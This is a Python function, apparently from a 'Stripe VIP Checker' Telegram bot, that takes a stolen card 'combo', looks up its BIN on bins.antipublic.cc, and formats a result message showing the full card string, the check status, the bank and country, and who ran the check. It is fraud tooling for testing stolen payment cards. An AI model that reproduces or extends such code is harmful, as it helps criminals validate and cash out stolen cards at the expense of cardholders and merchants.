import requests

def send(cc, last, username, time_taken):
    ii = cc[:6]

    # Fixed amount (no random)
    fixed_amount = "1"

    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{ii}')
        data = response.json()

        if response.status_code == 200:
            bank = data.get("bank", "Unknown")
            emj = data.get("country_flag", "🏳️")
            do = data.get("country", "Unknown")
            dicr = data.get("brand", "Unknown")
            typ = data.get("type", "Unknown")
        else:
            bank = emj = do = dicr = typ = 'Unknown'
    except Exception:
        bank = emj = do = dicr = typ = 'Unknown'

    # 🔥 GOLD STYLE UI DESIGN 🔥
    msg1 = f"""👑 <b>STRIPE VIP CHECKER</b>
〰️〰️〰️〰️〰️〰️〰️
💳 <b>Combo:</b> <code>{cc}</code>
📝 <b>Status:</b> {last}
⏳ <b>Time:</b> {time_taken}s
〰️〰️〰️〰️〰️〰️〰️
🏦 <b>Bank:</b> {bank}
🏳️ <b>Info:</b> {dicr} - {typ}
🌍 <b>Country:</b> {do} {emj}
〰️〰️〰️〰️〰️〰️〰️
<b>👤 Checked By: @{username}</b>
<b>👨‍💻 Master: @Rusisvirus</b>
"""
    return msg1
